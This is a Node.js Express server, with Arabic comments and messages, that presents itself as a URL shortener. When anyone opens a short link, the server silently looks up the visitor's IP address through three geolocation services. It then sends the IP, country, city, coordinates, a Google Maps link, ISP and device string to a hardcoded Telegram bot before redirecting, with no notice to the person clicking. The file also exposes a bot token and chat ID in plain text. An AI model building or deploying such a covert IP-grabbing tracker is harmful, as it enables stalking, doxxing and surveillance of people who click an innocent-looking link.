const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
const geoip = require('geoip-lite');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getLocationFromMultipleSources(ip) {
  let best = null;

  // الطريقة 1: ipapi.co (جيد جداً)
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
    if (res.data && res.data.country_name) {
      best = {
        country: res.data.country_name,
        city: res.data.city || 'N/A',
        region: res.data.region || 'N/A',
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        isp: res.data.org || 'N/A',
        type: 'ipapi.co'
      };
      return best;
    }
  } catch (err) {
    console.log('ipapi.co error');
  }

  // الطريقة 2: ip-api.com
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar&fields=country,city,regionName,lat,lon,isp,status`, { timeout: 3000 });
    if (res.data.status === 'success' && res.data.lat && res.data.lon) {
      best = {
        country: res.data.country,
        city: res.data.city || 'N/A',
        region: res.data.regionName || 'N/A',
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp || 'N/A',
        type: 'ip-api'
      };
      return best;
    }
  } catch (err) {
    console.log('ip-api error');
  }

  // الطريقة 3: geoip-lite
  try {
    const geo = geoip.lookup(ip);
    if (geo && geo.ll) {
      best = {
        country: geo.country,
        city: 'N/A',
        region: 'N/A',
        latitude: geo.ll[0],
        longitude: geo.ll[1],
        isp: 'N/A',
        type: 'geoip-lite'
      };
      return best;
    }
  } catch (err) {
    console.log('geoip-lite error');
  }

  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
  try {
    const location = await getLocationFromMultipleSources(ip);

    let message = `
🔗 رابط جديد تم فتحه!
━━━━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
━━━━━━━━━━━━━━
🔌 IP Address: ${ip}
`;

    if (location) {
      const mapsUrl = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
      message += `
🌍 ISP: ${location.isp}
🏳️ الدولة: ${location.country}
🏙️ المدينة: ${location.city}
🗺️ المنطقة: ${location.region}
📊 دائرة العرض: ${location.latitude}
📊 خط الطول: ${location.longitude}
🗺️ الموقع: ${mapsUrl}
📡 المصدر: ${location.type}
`;
    } else {
      message += `
⚠️ الموقع: غير محدد (VPN/Proxy محتمل)
`;
    }

    message += `
━━━━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ الوقت: ${new Date().toISOString()}
    `.trim();

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message }
    );
  } catch (err) {
    console.error('Telegram error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: 'الرابط مطلوب' });
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = {
    original: url,
    created: new Date(),
    clicks: 0
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('الرابط غير موجود');
  }

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent);

  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});